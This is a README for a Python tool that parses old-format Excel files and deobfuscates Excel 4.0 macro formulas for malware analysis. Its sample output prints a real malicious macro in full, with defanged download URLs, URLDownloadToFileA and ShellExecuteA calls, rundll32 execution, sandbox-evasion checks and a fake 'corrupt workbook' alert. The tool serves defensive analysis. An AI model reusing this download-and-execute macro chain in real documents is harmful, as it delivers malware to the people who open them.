# xls_Macro4_parser
This file takes an Ms-Excel 97-2003 format CDF file and parses the workbook to find any formulas used and prints them if present. 
For somefiles, it can deobfuscate and prints the strings. 
Example: 
>>xls_Macro4_parser.py e0632a05a2951a71bc525eba22918cd76c8fcae7da778e7a873bf87c06428886 

Gives output as

 list of forumlas
>>>>Cell :: EN64870 :: Formula used in that cell
****************************************************************************************************
if decryption is possible : 
>>>>['', '', '="hxxps:// andikachandra[.]com/ wp-keys.php"', '', '=FREAD(R[43607]C[66],255)', '', '=CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open",R[-25569]C[-26],R[2577]C[-84],0,5)', '', '=IF(GET.WORKSPACE(14)<390,GOTO(R[47857]C[38]),)', '', '=IF(GET.WINDOW(7),GOTO(R[47177]C[-43]),)', '', '=IF(ISNUMBER(SEARCH("Windows",GET.WORKSPACE(1))),,GOTO(R[46994]C[-62]))', '', '=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,R[24545]C[16],R[-4002]C[-57],0,0)', '', '', '', '', '=IF(GET.WINDOW(23)<3,GOTO(R[40195]C[-180]),)', '', '', '=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,R[-29033]C[-1],R[19440]C[46],0,0)', '', '', '="EXPORT HKCU\\Software\\Microsoft\\Office\\"', '', '="The workbook cannot be opened or repaired by Microsoft Excel because it\'s corrupt."', '', '=APP.MAXIMIZE()', '', '=ALERT(R[-10659]C[59])', '', '', '=IF(GET.WORKSPACE(42),,GOTO(R[20496]C[-97]))', '', '', '="C:\\Users\\Public\\D50djS.html"', '', '="C:\\Users\\Public\\u84Wh.reg"', '', '', '=IF(GET.WORKSPACE(19),,GOTO(R[13773]C[-115]))', '', '=FCLOSE(R[7278]C[-74])', '', '', '=IF(ISERROR(R[8283]C[-177]),GOTO(R[12577]C[-136]),)', '', '=IF(GET.WINDOW(20),,GOTO(R[11952]C[-81]))', '', '=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,R[-10355]C[91],R[42797]C[198],0,0)', '', '=WHILE(ISERROR(FILES(R[-12265]C[-17])))', '=WAIT(NOW()+"00:00:01")', '=NEXT()', '', '=IF(GET.WORKSPACE(31),GOTO(R[10604]C[-187]),)', '', '="C:\\Users\\Public\\ffiShHw4.html"', '', '=CLOSE(FALSE)', '', '', '', '=FOPEN(R[-16881]C[94])', '', '', '', '', '=FILES(R[-46081]C[146])', '', '', '="hxxp://gatemovie[.]online/wp-keys[.]php"', '', '', '=FILES(R[17889]C[9])', '', '=FILE.DELETE(R[-19682]C[-47])', '', '=IF(ISERROR(R[-26804]C[65]),,RUN(R[-40097]C[-82]))', '', '=R[1950]C[81]&",DllRegisterServer"', '', '=FPOS(R[-5789]C[-118],215)', '', '="C:\\Windows\\system32\\rundll32.exe"', '', '="hxxps://docs[.]microsoft[.]com/en-us/officeupdates/office-msi-non-security-updates"', '', '=IF(ISNUMBER(SEARCH("0001",R[-52119]C[-154])),GOTO(R[-2240]C[-102]),)', '', '=IF(GET.WORKSPACE(13)<770,GOTO(R[-3625]C[-27]),)', '', '="C:\\Windows\\system32\\reg.exe"', '', '=R[7343]C[-69]&GET.WORKSPACE(2)&"\\Excel\\Security "&R[3246]C[73]&" /y"', '', '', '', '=CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open",R[-18545]C[-137],R[-35241]C[-41],0,5)', '']

Formulas used in the excel along with their count
>>>>{'SET.VALUE': 10, 'FORMULA': 42, 'RUN': 30, 'GOTO': 30}

